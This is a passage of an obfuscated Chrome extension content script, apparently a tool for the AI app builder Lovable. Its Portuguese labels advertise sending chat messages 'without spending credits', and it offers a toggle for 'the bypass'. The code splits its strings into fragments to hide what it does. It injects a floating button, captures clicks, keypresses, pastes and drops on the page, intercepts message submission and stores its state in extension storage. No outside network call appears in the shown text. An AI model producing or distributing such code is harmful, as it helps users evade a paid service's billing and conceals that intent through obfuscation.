const _nfd2ec5=document['cre'+'ate'+'Ele'+'men'+'t']('div');
_nfd2ec5['sty'+'le']['css'+'Tex'+'t']='bac'+'kgr'+'oun'+'d:#'+'181'+'81b'+'!im'+'por'+'tan'+'t;
b'+'ord'+'er:'+'1px'+'\x20so'+'lid'+'\x20rg'+'ba('+'255'+',25'+'5,2'+'55,'+'.12'+')!i'+'mpo'+'rta'+'nt;
'+('bor'+'der'+'-ra'+'diu'+'s:1'+'4px'+'!im'+'por'+'tan'+'t;
p'+'add'+'ing'+':20'+'px!'+'imp'+'ort'+'ant'+';
ma'+'x-w'+'idt'+'h:3'+'20p'+'x!i'+'mpo'+'rta'+'nt;
')+('box'+'-sh'+'ado'+'w:0'+'\x2012'+'px\x20'+'40p'+'x\x20r'+'gba'+'(0,'+'0,0'+',.5'+')!i'+'mpo'+'rta'+'nt;
');
const _n19360e=document['cre'+'ate'+'Ele'+'men'+'t']('div');
_n19360e['tex'+'tCo'+'nte'+'nt']='⚠\x20D'+'esa'+'tiv'+'ar\x20'+'o\x20b'+'ypa'+'ss?',_n19360e['sty'+'le']['css'+'Tex'+'t']='col'+'or:'+'#ff'+'f!i'+'mpo'+'rta'+'nt;
'+'fon'+'t-s'+'ize'+':15'+'px!'+'imp'+'ort'+'ant'+';
fo'+'nt-'+'wei'+'ght'+':70'+'0!i'+'mpo'+'rta'+'nt;
'+'mar'+'gin'+'-bo'+'tto'+'m:8'+'px!'+'imp'+'ort'+'ant'+';
';
const _n2075a6=document['cre'+'ate'+'Ele'+'men'+'t']('div');
_n2075a6['tex'+'tCo'+'nte'+'nt']='Se\x20'+'des'+'ati'+'var'+'\x20e\x20'+'env'+'iar'+'\x20pe'+'lo\x20'+'cha'+'t\x20n'+'ati'+'vo\x20'+'do\x20'+'Lov'+'abl'+'e,\x20'+'as\x20'+'men'+'sag'+'ens'+'\x20vã'+'o\x20g'+'ast'+'ar\x20'+'cré'+'dit'+'os\x20'+'nor'+'mal'+'men'+'te.',_n2075a6['sty'+'le']['css'+'Tex'+'t']='col'+'or:'+'rgb'+'a(2'+'55,'+'255'+',25'+'5,.'+'7)!'+'imp'+'ort'+'ant'+';
fo'+'nt-'+'siz'+'e:1'+'3px'+'!im'+'por'+'tan'+'t;
l'+'ine'+'-he'+'igh'+'t:1'+'.5!'+'imp'+'ort'+'ant'+';
ma'+'rgi'+'n-b'+'ott'+'om:'+'18p'+'x!i'+'mpo'+'rta'+'nt;
';
const _n1c88dc=document['cre'+'ate'+'Ele'+'men'+'t']('div');
_n1c88dc['sty'+'le']['css'+'Tex'+'t']='dis'+'pla'+'y:f'+'lex'+'!im'+'por'+'tan'+'t;
g'+'ap:'+'8px'+'!im'+'por'+'tan'+'t;
j'+'ust'+'ify'+'-co'+'nte'+'nt:'+'fle'+'x-e'+'nd!'+'imp'+'ort'+'ant'+';
';
const _n54b036=document['cre'+'ate'+'Ele'+'men'+'t']('but'+'ton');
_n54b036['typ'+'e']='but'+'ton',_n54b036['tex'+'tCo'+'nte'+'nt']='Can'+'cel'+'ar',_n54b036['sty'+'le']['css'+'Tex'+'t']='bac'+'kgr'+'oun'+'d:t'+'ran'+'spa'+'ren'+'t!i'+'mpo'+'rta'+'nt;
'+'bor'+'der'+':1p'+'x\x20s'+'oli'+'d\x20r'+'gba'+'(25'+'5,2'+'55,'+'255'+',.2'+'5)!'+'imp'+'ort'+'ant'+';
'+('col'+'or:'+'#ff'+'f!i'+'mpo'+'rta'+'nt;
'+'pad'+'din'+'g:8'+'px\x20'+'14p'+'x!i'+'mpo'+'rta'+'nt;
'+'bor'+'der'+'-ra'+'diu'+'s:8'+'px!'+'imp'+'ort'+'ant'+';
')+('cur'+'sor'+':po'+'int'+'er!'+'imp'+'ort'+'ant'+';
fo'+'nt-'+'siz'+'e:1'+'3px'+'!im'+'por'+'tan'+'t;
f'+'ont'+'-we'+'igh'+'t:6'+'00!'+'imp'+'ort'+'ant'+';
');
const _n5a8497=document['cre'+'ate'+'Ele'+'men'+'t']('but'+'ton');
_n5a8497['typ'+'e']='but'+'ton',_n5a8497['tex'+'tCo'+'nte'+'nt']='Des'+'ati'+'var'+'\x20me'+'smo'+'\x20as'+'sim',_n5a8497['sty'+'le']['css'+'Tex'+'t']='bac'+'kgr'+'oun'+'d:#'+'dc2'+'626'+'!im'+'por'+'tan'+'t;
b'+'ord'+'er:'+'non'+'e!i'+'mpo'+'rta'+'nt;
'+'col'+'or:'+'#ff'+'f!i'+'mpo'+'rta'+'nt;
'+('pad'+'din'+'g:8'+'px\x20'+'14p'+'x!i'+'mpo'+'rta'+'nt;
'+'bor'+'der'+'-ra'+'diu'+'s:8'+'px!'+'imp'+'ort'+'ant'+';
cu'+'rso'+'r:p'+'oin'+'ter'+'!im'+'por'+'tan'+'t;
')+('fon'+'t-s'+'ize'+':13'+'px!'+'imp'+'ort'+'ant'+';
fo'+'nt-'+'wei'+'ght'+':70'+'0!i'+'mpo'+'rta'+'nt;
'),_n54b036['add'+'Eve'+'ntL'+'ist'+'ene'+'r']('cli'+'ck',()=>_n33fd74['rem'+'ove']()),_n5a8497['add'+'Eve'+'ntL'+'ist'+'ene'+'r']('cli'+'ck',()=>{
_n33fd74['rem'+'ove'](),_n443bb3();
}
),_n33fd74['add'+'Eve'+'ntL'+'ist'+'ene'+'r']('cli'+'ck',_n516daa=>{
if(_n516daa['tar'+'get']===_n33fd74)_n33fd74['rem'+'ove']();
}
),_n1c88dc['app'+'end'+'Chi'+'ld'](_n54b036),_n1c88dc['app'+'end'+'Chi'+'ld'](_n5a8497),_nfd2ec5['app'+'end'+'Chi'+'ld'](_n19360e),_nfd2ec5['app'+'end'+'Chi'+'ld'](_n2075a6),_nfd2ec5['app'+'end'+'Chi'+'ld'](_n1c88dc),_n33fd74['app'+'end'+'Chi'+'ld'](_nfd2ec5),document['doc'+'ume'+'ntE'+'lem'+'ent']['app'+'end'+'Chi'+'ld'](_n33fd74);
}
function _n311f26(){
if(document['get'+'Ele'+'men'+'tBy'+'Id']('__q'+'l_n'+'b_b'+'tn_'+'_'))return;
const _n388936=document['cre'+'ate'+'Ele'+'men'+'t']('but'+'ton');
_n388936['id']='__q'+'l_n'+'b_b'+'tn_'+'_',_n388936['typ'+'e']='but'+'ton',_n388936['tit'+'le']='Lov'+'abl'+'e\x20∞'+'\x20—\x20'+'Env'+'iar'+'\x20se'+'m\x20g'+'ast'+'ar\x20'+'cré'+'dit'+'os',_n388936['sty'+'le']['css'+'Tex'+'t']='pos'+'iti'+'on:'+'fix'+'ed!'+'imp'+'ort'+'ant'+';
bo'+'tto'+'m:2'+'4px'+'!im'+'por'+'tan'+'t;
r'+'igh'+'t:2'+'4px'+'!im'+'por'+'tan'+'t;
'+('wid'+'th:'+'44p'+'x!i'+'mpo'+'rta'+'nt;
'+'hei'+'ght'+':44'+'px!'+'imp'+'ort'+'ant'+';
bo'+'rde'+'r-r'+'adi'+'us:'+'50%'+'!im'+'por'+'tan'+'t;
')+('bor'+'der'+':2p'+'x\x20s'+'oli'+'d\x20#'+'ef4'+'444'+'!im'+'por'+'tan'+'t;
b'+'ack'+'gro'+'und'+':#1'+'818'+'1b!'+'imp'+'ort'+'ant'+';
')+('cur'+'sor'+':po'+'int'+'er!'+'imp'+'ort'+'ant'+';
z-'+'ind'+'ex:'+'214'+'748'+'364'+'7!i'+'mpo'+'rta'+'nt;
'+'pad'+'din'+'g:0'+'!im'+'por'+'tan'+'t;
')+('dis'+'pla'+'y:f'+'lex'+'!im'+'por'+'tan'+'t;
a'+'lig'+'n-i'+'tem'+'s:c'+'ent'+'er!'+'imp'+'ort'+'ant'+';
ju'+'sti'+'fy-'+'con'+'ten'+'t:c'+'ent'+'er!'+'imp'+'ort'+'ant'+';
')+('box'+'-sh'+'ado'+'w:0'+'\x200\x20'+'0\x203'+'px\x20'+'rgb'+'a(2'+'39,'+'68,'+'68,'+'.35'+'),0'+'\x204p'+'x\x201'+'6px'+'\x20rg'+'ba('+'0,0'+',0,'+'.5)'+'!im'+'por'+'tan'+'t;
')+('tra'+'nsi'+'tio'+'n:b'+'ox-'+'sha'+'dow'+'\x20.2'+'s,\x20'+'bor'+'der'+'-co'+'lor'+'\x20.2'+'s!i'+'mpo'+'rta'+'nt;
');
const _n53b62f=document['cre'+'ate'+'Ele'+'men'+'t']('img');
_n53b62f['src']=_n213a2e('ico'+'n.p'+'ng'),_n53b62f['sty'+'le']['css'+'Tex'+'t']='wid'+'th:'+'24p'+'x!i'+'mpo'+'rta'+'nt;
'+'hei'+'ght'+':24'+'px!'+'imp'+'ort'+'ant'+';
bo'+'rde'+'r-r'+'adi'+'us:'+'50%'+'!im'+'por'+'tan'+'t;
p'+'oin'+'ter'+'-ev'+'ent'+'s:n'+'one'+'!im'+'por'+'tan'+'t;
',_n388936['app'+'end'+'Chi'+'ld'](_n53b62f);
const _n1c53a4=document['cre'+'ate'+'Ele'+'men'+'t']('spa'+'n');
_n1c53a4['id']='__q'+'l_n'+'b_d'+'ot_'+'_',_n1c53a4['sty'+'le']['css'+'Tex'+'t']='pos'+'iti'+'on:'+'abs'+'olu'+'te!'+'imp'+'ort'+'ant'+';
bo'+'tto'+'m:-'+'2px'+'!im'+'por'+'tan'+'t;
r'+'igh'+'t:-'+'2px'+'!im'+'por'+'tan'+'t;
'+('wid'+'th:'+'14p'+'x!i'+'mpo'+'rta'+'nt;
'+'hei'+'ght'+':14'+'px!'+'imp'+'ort'+'ant'+';
bo'+'rde'+'r-r'+'adi'+'us:'+'50%'+'!im'+'por'+'tan'+'t;
')+('bor'+'der'+':2p'+'x\x20s'+'oli'+'d\x20#'+'181'+'81b'+'!im'+'por'+'tan'+'t;
b'+'ack'+'gro'+'und'+':#e'+'f44'+'44!'+'imp'+'ort'+'ant'+';
tr'+'ans'+'iti'+'on:'+'bac'+'kgr'+'oun'+'d\x20.'+'2s!'+'imp'+'ort'+'ant'+';
'),_n388936['app'+'end'+'Chi'+'ld'](_n1c53a4),_n2c6956=_n1c53a4,_n214bc4(),_n3432e6(![]),_n5122f3(),_n388936['add'+'Eve'+'ntL'+'ist'+'ene'+'r']('cli'+'ck',()=>{
if(_ndb7900)return;
if(_n1d9b8e)_n110f58(()=>_n768517(![]));
else _n768517(!![]);
}
);
let _n39d81d=![],_ndb7900=![],_n352adb=0x0,_n235d14=0x0,_n48e4ee=0x0,_nf44ff2=0x0;
_n388936['add'+'Eve'+'ntL'+'ist'+'ene'+'r']('poi'+'nte'+'rdo'+'wn',_n51f879=>{
_n39d81d=!![],_ndb7900=![],_n352adb=_n51f879['cli'+'ent'+'X'],_n235d14=_n51f879['cli'+'ent'+'Y'];
const _n2a71ed=_n388936['get'+'Bou'+'ndi'+'ngC'+'lie'+'ntR'+'ect']();
_n48e4ee=_n2a71ed['top'],_nf44ff2=_n2a71ed['lef'+'t'];
try{
_n388936['set'+'Poi'+'nte'+'rCa'+'ptu'+'re'](_n51f879['poi'+'nte'+'rId']);
}
catch(_n2bb5e6){
}
}
),_n388936['add'+'Eve'+'ntL'+'ist'+'ene'+'r']('poi'+'nte'+'rmo'+'ve',_n55fd6f=>{
if(!_n39d81d)return;
const _n300511=_n55fd6f['cli'+'ent'+'X']-_n352adb,_n44c530=_n55fd6f['cli'+'ent'+'Y']-_n235d14;
if(Math['abs'](_n300511)>0x4||Math['abs'](_n44c530)>0x4)_ndb7900=!![];
if(!_ndb7900)return;
_n4ee4f7=!![],_n388936['sty'+'le']['top']=Math['max'](0x8,_n48e4ee+_n44c530)+'px',_n388936['sty'+'le']['lef'+'t']=Math['max'](0x8,_nf44ff2+_n300511)+'px',_n388936['sty'+'le']['rig'+'ht']='aut'+'o',_n388936['sty'+'le']['bot'+'tom']='aut'+'o';
}
),_n388936['add'+'Eve'+'ntL'+'ist'+'ene'+'r']('poi'+'nte'+'rup',_n46442f=>{
_n39d81d=![];
if(_ndb7900){
const _n1aef5={
}
;
_n1aef5['top']=_n388936['sty'+'le']['top'],_n1aef5['lef'+'t']=_n388936['sty'+'le']['lef'+'t'];
const _n50f400={
}
;
_n50f400[_n145ab8]=_n1aef5,_n541a20(_n50f400);
}
try{
_n388936['rel'+'eas'+'ePo'+'int'+'erC'+'apt'+'ure'](_n46442f['poi'+'nte'+'rId']);
}
catch(_n1f6a66){
}
}
),document['doc'+'ume'+'ntE'+'lem'+'ent']['app'+'end'+'Chi'+'ld'](_n388936),_ne2eca8=_n388936,_n403e81([_n145ab8],_n26d477=>{
if(_n26d477&&_n26d477[_n145ab8]&&_n26d477[_n145ab8]['top']&&_n26d477[_n145ab8]['lef'+'t']){
const _n21fcfc=parseFloat(_n26d477[_n145ab8]['top'])||0x0,_n5690a0=parseFloat(_n26d477[_n145ab8]['lef'+'t'])||0x0;
if(_n21fcfc>=0x8&&_n5690a0>=0x8&&_n21fcfc<window['inn'+'erH'+'eig'+'ht']-0x24&&_n5690a0<window['inn'+'erW'+'idt'+'h']-0x24)_n4ee4f7=!![],_n388936['sty'+'le']['top']=_n26d477[_n145ab8]['top'],_n388936['sty'+'le']['lef'+'t']=_n26d477[_n145ab8]['lef'+'t'],_n388936['sty'+'le']['rig'+'ht']='aut'+'o',_n388936['sty'+'le']['bot'+'tom']='aut'+'o';
else{
try{
chrome['sto'+'rag'+'e']['loc'+'al']['rem'+'ove'](_n145ab8);
}
catch(_n3edbc3){
}
_n470f14();
}
}
else _n470f14();
}
);
}
function _nf6b76d(){
if(_n1d9b8e){
_n1d9b8e=![],_n441e06(),document['rem'+'ove'+'Eve'+'ntL'+'ist'+'ene'+'r']('key'+'dow'+'n',_n2d3804,!![]),document['rem'+'ove'+'Eve'+'ntL'+'ist'+'ene'+'r']('cli'+'ck',_n4bbcf4,!![]),document['rem'+'ove'+'Eve'+'ntL'+'ist'+'ene'+'r']('pas'+'te',_n1b8af6,!![]),document['rem'+'ove'+'Eve'+'ntL'+'ist'+'ene'+'r']('dra'+'gen'+'ter',_n46d7d2,!![]),document['rem'+'ove'+'Eve'+'ntL'+'ist'+'ene'+'r']('dra'+'gov'+'er',_n3416eb,!![]),document['rem'+'ove'+'Eve'+'ntL'+'ist'+'ene'+'r']('dra'+'gle'+'ave',_n250ea4,!![]),document['rem'+'ove'+'Eve'+'ntL'+'ist'+'ene'+'r']('dro'+'p',_n41db29,!![]),_n591638();
const _ndc608b={
}
;
_ndc608b[_n3f8ab0]=![],_n541a20(_ndc608b);
}
_n3779d0&&_nf0b1c6(![]),_ne2eca8&&(_ne2eca8['rem'+'ove'](),_ne2eca8=null),_n2c6956=null,_n9054bd(),_n4deb4e(),_n42a806=[];
}
function _n24d3c8(_n2a7ca6){
if(_n1d9b8e)return;
if(_creditWarningAllowed)return;
if(!_n3779d0)return;
const _n38f05b=_n2a7ca6['tar'+'get']?_n2a7ca6['tar'+'get']['clo'+'ses'+'t']('but'+'ton'):null;
if(!_n38f05b)return;
const _n303af5=_n34a31d(_n3779d0);
if(!_n303af5||_n38f05b!==_n303af5)return;
const _n2aecb8=_n5c1974(_n3779d0);
if(!_n2aecb8)return;
const _n55ed01=(_n2aecb8['tag'+'Nam'+'e']==='TEX'+'TAR'+'EA'?_n2aecb8['val'+'ue']:_n2aecb8['tex'+'tCo'+'nte'+'nt']||'')['tri'+'m']();
if(!_n55ed01)return;
_n2a7ca6['pre'+'ven'+'tDe'+'fau'+'lt'](),_n2a7ca6['sto'+'pIm'+'med'+'iat'+'ePr'+'opa'+'gat'+'ion'](),_showCreditWarningModal(()=>{
_creditWarningAllowed=!![];
try{
_n38f05b['cli'+'ck']();
}
catch(_n96b118){
}
setTimeout(()=>{
_creditWarningAllowed=![];
}
,0x258);
}
);
}
function _n52a9ce(_n1ae0f1){
if(_n1d9b8e)return;
if(_creditWarningAllowed)return;
if(_n1ae0f1['key']!=='Ent'+'er'||_n1ae0f1['shi'+'ftK'+'ey']||_n1ae0f1['ctr'+'lKe'+'y']||_n1ae0f1['met'+'aKe'+'y'])return;
if(!_n3779d0)return;
const _n50174c=_n5c1974(_n3779d0);
if(!_n50174c)return;
const _n2cbe5a=_n50174c===_n1ae0f1['tar'+'get']||_n50174c['con'+'tai'+'ns'](_n1ae0f1['tar'+'get']);
if(!_n2cbe5a)return;
const _n2ce6da=(_n50174c['tag'+'Nam'+'e']==='TEX'+'TAR'+'EA'?_n50174c['val'+'ue']:_n50174c['tex'+'tCo'+'nte'+'nt']||'')['tri'+'m']();
if(!_n2ce6da)return;
_n1ae0f1['pre'+'ven'+'tDe'+'fau'+'lt'](),_n1ae0f1['sto'+'pIm'+'med'+'iat'+'ePr'+'opa'+'gat'+'ion'](),_showCreditWarningModal(()=>{
_creditWarningAllowed=!![];
try{
const _n40dcbb=_n34a31d(_n3779d0);
if(_n40dcbb)_n40dcbb['cli'+'ck']();
}
catch(_n6e5d6b){
}
setTimeout(()=>{
_creditWarningAllowed=![];
}
,0x258);
}
);
}
let _n2bdd24=0x0;
const _n12467a=0x4;
function _ned8518(){
_n403e81(_n3db245,_n2baca2=>{
const _n1fdf77=_n176bc6(_n2baca2);
if(_n1fdf77)_n2bdd24=0x0,!_ne2eca8&&(_n311f26(),_n5550c4(),_n768517(!![]));
else _ne2eca8&&(_n2bdd24++,_n2bdd24>=_n12467a&&_nf6b76d());
}
);
}
function _n2955d6(){
_ned8518(),_n5550c4();
let _ncd1db7=![];
const _n3f65e0=new MutationObserver(()=>{
if(_ncd1db7)return;
_ncd1db7=!![],requestAnimationFrame(()=>{
_ncd1db7=![],_n5550c4();
}
);
}
),_n1b2e47={
}
;
_n1b2e47['chi'+'ldL'+'ist']=!![],_n1b2e47['sub'+'tre'+'e']=!![],_n3f65e0['obs'+'erv'+'e'](document['bod'+'y'],_n1b2e47);
const _n574291=()=>{
_n470f14();
if(_n1d9b8e)_n22248d();
}
;
window['add'+'Eve'+'ntL'+'ist'+'ene'+'r']('res'+'ize',_n574291),window['add'+'Eve'+'ntL'+'ist'+'ene'+'r']('scr'+'oll',_n574291,!![]);
window['vis'+'ual'+'Vie'+'wpo'+'rt']&&(window['vis'+'ual'+'Vie'+'wpo'+'rt']['add'+'Eve'+'ntL'+'ist'+'ene'+'r']('res'+'ize',_n574291),window['vis'+'ual'+'Vie'+'wpo'+'rt']['add'+'Eve'+'ntL'+'ist'+'ene'+'r']('scr'+'oll',_n574291));
try{
chrome['sto'+'rag'+'e']['onC'+'han'+'ged']['add'+'Lis'+'ten'+'er']((_n3b7453,_nf3cc10)=>{
if(_nf3cc10!=='loc'+'al')return;
if(_n3db245['som'+'e'](_n277b22=>_n277b22 in _n3b7453))_ned8518();
}
);
}
catch(_n1b7e2a){
_n4f7061();
}
document['add'+'Eve'+'ntL'+'ist'+'ene'+'r']('vis'+'ibi'+'lit'+'ych'+'ang'+'e',()=>{
document['vis'+'ibi'+'lit'+'ySt'+'ate']==='vis'+'ibl'+'e'&&(_n2bdd24=0x0,_ned8518());
}
),setInterval(_ned8518,0x4e20),document['add'+'Eve'+'ntL'+'ist'+'ene'+'r']('cli'+'ck',_n24d3c8,!![]),document['add'+'Eve'+'ntL'+'ist'+'ene'+'r']('key'+'dow'+'n',_n52a9ce,!![]),setTimeout(function(){
try{
const _n5df064={
}
;
_n5df064['typ'+'e']='__Q'+'L_S'+'ET_'+'GUA'+'RD_'+'_',_n5df064['blo'+'ck']=!_n1d9b8e,window['pos'+'tMe'+'ssa'+'ge'](_n5df064,'*');
}
catch(_n226846){
}
}
,0x1f4);
}
if(document['bod'+'y'])_n2955d6();
else document['add'+'Eve'+'ntL'+'ist'+'ene'+'r']('DOM'+'Con'+'ten'+'tLo'+'ade'+'d',_n2955d6);
}
());
